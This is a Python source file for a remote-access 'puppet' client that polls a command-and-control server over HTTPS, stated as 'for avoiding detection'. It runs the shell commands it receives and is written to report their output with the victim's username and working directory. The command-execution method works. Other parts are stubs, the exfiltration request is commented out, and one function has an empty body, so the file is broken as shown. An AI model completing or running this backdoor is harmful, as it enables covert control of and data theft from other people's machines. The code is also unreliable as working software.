#!/usr/bin/env python3
import os
import sys
from datetime import datetime
from subprocess import getoutput as execute
from uuid import uuid4

from requests import Session
from urllib3 import disable_warnings

disable_warnings()
DEFAULT_SERVER_PORT = 443


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Polls the CNC server, receives the commands from there, "
                                        "executes them and sends back the results. "
                                        "The client and the server use HTTPS for avoiding detection.")
    parser.add_argument('--server-address',
                        dest='server_address',
                        required=True,
                        type=str,
                        help='Specify an IP address or a domain name of the server '
                             'that receives the data stream from the puppet')
    parser.add_argument('--server-port',
                        dest='server_port',
                        required=False,
                        default=DEFAULT_SERVER_PORT,
                        type=int,
                        help='Specify the server port. '
                             f'{DEFAULT_SERVER_PORT}/tcp is set by default.')
    options = parser.parse_args()
    return options


class Puppet:
    def __init__(self, server_base_url: str):
        self.session = Session()
        self.session.verify = False
        self.session.headers['Session-ID'] = f"{uuid4()}"

        self.server_base_url = server_base_url

        self.work_dir = os.getcwd()
        self.user = os.getlogin()
        self.system_encoding = sys.getdefaultencoding()

    def get_command(self):
        pass

    def execute_command(self, task_type, command):
        os.chdir(self.work_dir)
        try:
            command_as_array = command.split(' ')
            if 'cd' == command_as_array[0] and len(command_as_array) == 2:
                self.work_dir = command_as_array[1]
                os.chdir(self.work_dir)
                result = ''
            else:
                result = execute(command)
        except Exception as e:
            result = str(e)
        if isinstance(result, bytes):
            result = result.decode(self.system_encoding, 'ignore')
        return {
            "user": self.user,
            "pwd": self.work_dir,
            "system_encoding": self.system_encoding,
            "data": result
        }

    def send_results(self, puppet_message: dict):
        pass


def get_command(server_base_url):


def communicate(event):
    session_id = ''
    now = datetime.now()
    with Session() as session:
        def poll_cnc_server(session_id):
            if session_id:
                session.headers['Session-ID'] = session_id

            # FIXME get the command, execute it and return the results
            # resp = session.post(f"{server_base_url}/communicate",
            #                     json={
            #                         'creation_timestamp': now.strftime("%m/%d/%Y, %H:%M:%S"),
            #                         'system_encoding': sys.getdefaultencoding(),
            #                         'username': os.getlogin(),
            #                         'pwd': os.getcwd(),
            #                         '': normalize_event(event)
            #                     },
            #                     verify=False)

        while True:
            try:
                poll_cnc_server(session_id)
            except Exception as e:
                print(e)


options = get_arguments()
server_base_url = f"https://{options.server_address}:{options.server_port}"
